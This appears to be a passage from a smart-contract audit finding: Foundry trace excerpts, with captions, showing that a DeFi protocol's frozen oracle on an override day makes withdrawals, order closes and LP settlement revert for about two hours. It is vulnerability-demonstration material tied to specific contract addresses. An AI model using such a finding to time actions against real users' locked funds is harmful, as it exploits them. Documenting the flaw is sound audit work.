    ├─ [15891] 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e::maxWithdraw(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B) [staticcall]
    │   └─ ← [Return] 99252793297 [9.925e10]
    ├─ [0] VM::prank(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B)
    │   └─ ← [Return]
    ├─ [213984] 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e::withdraw(99252793297 [9.925e10], 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B, 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B)
    │   ├─ [29630] 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D::transfer(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B, 99252793297 [9.925e10])
    │   │   ├─ emit Transfer(from: 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e, to: 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B, amount: 99252793297 [9.925e10])
    │   │   └─ ← [Return] true
```

One second later, Mon 21:59:27 UTC. Still frozen; the withdrawal reverts (lines 2943-2958, 3048-3061)
```
    ├─ [0] VM::warp(1794261567 [1.794e9])
    │   └─ ← [Return]
    ├─ [0] VM::roll(12069339 [1.206e7])
    │   └─ ← [Return]
    ├─ [13252] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::isOracleFrozen() [staticcall]
    │   ├─ [572] 0x802a0755413FB966b397155b5c5CC0198E6BEd3F::marketCalendarStatus(1794261567 [1.794e9], true, false, 3600) [staticcall]
    │   │   └─ ← [Return] true, true
    │   └─ ← [Return] true
    ├─ [12536] 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A::getFreeBuyingPowerAssets(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B) [staticcall]
    │   └─ ← [Return] 31630512978 [3.163e10]
    ├─ [0] VM::prank(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(CfdEngine__MarkPriceStale())
    │   └─ ← [Return]
    ├─ [446178] 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A::withdraw(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, 31630512978 [3.163e10])
    │   ├─ [328993] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::realizeCarryBeforeMarginChange(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B)
    │   │   │   │   └─ ← [Return] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e
    │   │   │   ├─ [3089] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e::markStalenessLimit() [staticcall]
    │   │   │   │   └─ ← [Return] 60
    │   │   │   ├─ [3727] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::fadMaxStaleness() [staticcall]
    │   │   │   │   └─ ← [Return] 259200 [2.592e5]
    │   │   │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    │   │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    ├─ [0] VM::prank(0x1329A7Fa975F2F8aA2cAc86A833f03655201d34f)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9]))
    │   └─ ← [Return]
    ├─ [203648] 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444::executeOrder(148, [])
    │   ├─ [177386] 0x0AE016ef599BCDF0bbBEDba441401c3B6C6184eA::executeOrder(148, []) [delegatecall]
```

Same second. The close reverts with the system's own age numbers, then LP settlement is called (lines 3126-3139)
```
    │   │   │   │   └─ ← [Return] 259200 [2.592e5]
    │   │   │   ├─ [2492] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkPrice() [staticcall]
    │   │   │   │   └─ ← [Return] 96101009 [9.61e7]
    │   │   │   ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   │   │   │   └─ ← [Return] 1794002366 [1.794e9]
    │   │   │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    │   │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    ├─ [0] VM::prank(0x1329A7Fa975F2F8aA2cAc86A833f03655201d34f)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9]))
    │   └─ ← [Return]
    ├─ [82670] 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444::settleLpEpoch([])
    │   ├─ [57968] 0x7B605D7C57C191379822705d8510109D4B2573aA::settleLpEpoch([]) [delegatecall]
```

Same second. LP settlement reverts and the LP has nothing to claim (lines 3160-3169)
```
    │   │   │   │   └─ ← [Return] 259200 [2.592e5]
    │   │   │   ├─ [2492] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkPrice() [staticcall]
    │   │   │   │   └─ ← [Return] 96101009 [9.61e7]
    │   │   │   ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   │   │   │   └─ ← [Return] 1794002366 [1.794e9]
    │   │   │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    │   │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794261567 [1.794e9])
    ├─ [11443] 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e::maxWithdraw(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B) [staticcall]
    │   └─ ← [Return] 0
```

Last second of the override day, Mon 23:59:59 UTC. Same three reverts (lines 3546-3553, 3654-3664, 3732-3742, 3768-3772)
```
    ├─ [0] VM::warp(1794268799 [1.794e9])
    │   └─ ← [Return]
    ├─ [0] VM::roll(12069339 [1.206e7])
    │   └─ ← [Return]
    ├─ [13252] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::isOracleFrozen() [staticcall]
    │   ├─ [572] 0x802a0755413FB966b397155b5c5CC0198E6BEd3F::marketCalendarStatus(1794268799 [1.794e9], true, false, 3600) [staticcall]
    │   │   └─ ← [Return] true, true
    │   └─ ← [Return] true
    │   │   │   ├─ [3727] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::fadMaxStaleness() [staticcall]
    │   │   │   │   └─ ← [Return] 259200 [2.592e5]
    │   │   │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    │   │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    │   └─ ← [Revert] CfdEngine__MarkPriceStale()
    ├─ [0] VM::prank(0x1329A7Fa975F2F8aA2cAc86A833f03655201d34f)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9]))
    │   └─ ← [Return]
    ├─ [203648] 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444::executeOrder(148, [])
    │   ├─ [177386] 0x0AE016ef599BCDF0bbBEDba441401c3B6C6184eA::executeOrder(148, []) [delegatecall]
    │   │   │   ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   │   │   │   └─ ← [Return] 1794002366 [1.794e9]
    │   │   │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    │   │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    │   └─ ← [Revert] PletherOracle__StalePrice(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    ├─ [0] VM::prank(0x1329A7Fa975F2F8aA2cAc86A833f03655201d34f)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9]))
    │   └─ ← [Return]
    ├─ [82670] 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444::settleLpEpoch([])
    │   ├─ [57968] 0x7B605D7C57C191379822705d8510109D4B2573aA::settleLpEpoch([]) [delegatecall]
    │   │   │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    │   │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    │   └─ ← [Revert] PletherOracle__StalePrice(3, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794268799 [1.794e9])
    ├─ [11443] 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e::maxWithdraw(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B) [staticcall]
    │   └─ ← [Return] 0
```

Mon 22:30:15 UTC. The production keeper's signed Pyth refresh is refused; the mark stays at Friday (lines 3775-3779, 3808-3818)
```
    ├─ [0] VM::warp(1794263415 [1.794e9])
    │   └─ ← [Return]
    ├─ [0] VM::roll(12069337 [1.206e7])
    │   └─ ← [Return]
    ├─ [0] VM::transact(0x69b1abc439eaf22f3ef1dea563937224637fd4eef0773641f9f2315604a66fa3)
    │   │   │   │   │   └─ ← [Return] 259200 [2.592e5]
    │   │   │   │   ├─ [2492] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkPrice() [staticcall]
    │   │   │   │   │   └─ ← [Return] 96101009 [9.61e7]
    │   │   │   │   ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   │   │   │   │   └─ ← [Return] 1794002366 [1.794e9]
    │   │   │   │   └─ ← [Revert] PletherOracle__StalePrice(1, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794263415 [1.794e9])
    │   │   │   └─ ← [Revert] PletherOracle__StalePrice(1, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794263415 [1.794e9])
    │   │   └─ ← [Revert] PletherOracle__StalePrice(1, 0x0000000000000000000000000000000000000000000000000000000000000000, 1794002366 [1.794e9], 259200 [2.592e5], 1794263415 [1.794e9])
    │   └─ ← [Return]
    ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   └─ ← [Return] 1794002366 [1.794e9]
```

Tue 00:00:00 UTC the override day ends. The production refresh at 00:00:28 lands and the same withdrawal pays out (lines 3819-3826, 3901-3902, 4045-4049)
```
    ├─ [0] VM::warp(1794268800 [1.794e9])
    │   └─ ← [Return]
    ├─ [0] VM::roll(12069338 [1.206e7])
    │   └─ ← [Return]
    ├─ [13336] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::isOracleFrozen() [staticcall]
    │   ├─ [656] 0x802a0755413FB966b397155b5c5CC0198E6BEd3F::marketCalendarStatus(1794268800 [1.794e9], false, false, 3600) [staticcall]
    │   │   └─ ← [Return] false, false
    │   └─ ← [Return] false
    ├─ [2642] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::lastMarkTime() [staticcall]
    │   └─ ← [Return] 1794268824 [1.794e9]
    │   ├─ [24830] 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D::transfer(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, 31630512978 [3.163e10])
    │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, amount: 31630512978 [3.163e10])
    │   │   └─ ← [Return] true
    │   ├─ emit Withdraw(account: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, asset: 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D, amount: 31630512978 [3.163e10])
    │   └─ ← [Stop]
```

From Mon 21:59:27 to 23:59:59 UTC the trader's 31,630.51 USDG withdrawal, its 1,000,000-unit close and the LP's 100,000 USDG redemption all revert. At 21:59:26 and again from Tue 00:00 UTC the same calls pay out.

